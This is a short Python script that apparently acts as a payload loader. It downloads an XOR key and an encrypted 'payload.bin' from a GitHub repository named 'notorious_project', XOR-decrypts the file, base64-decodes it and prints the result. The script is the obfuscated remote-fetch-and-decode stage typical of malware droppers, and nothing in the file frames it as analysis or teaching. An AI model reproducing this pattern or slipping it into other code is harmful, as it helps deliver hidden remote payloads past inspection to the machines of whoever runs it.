import base64
import requests

url_keys = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/keys"
url_payload = "https://raw.githubusercontent.com/utkuberkaytan/notorious_project/refs/heads/main/payload.bin"

res_keys = requests.get(url_keys)
lines = res_keys.text.strip().split("\n")
xor_key = lines[0].strip().encode()

res_payload = requests.get(url_payload)
encrypted = res_payload.content

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

decrypted_xor = xor_decrypt(encrypted, xor_key)
decrypted_payload = base64.b64decode(decrypted_xor)

print(decrypted_payload.decode())
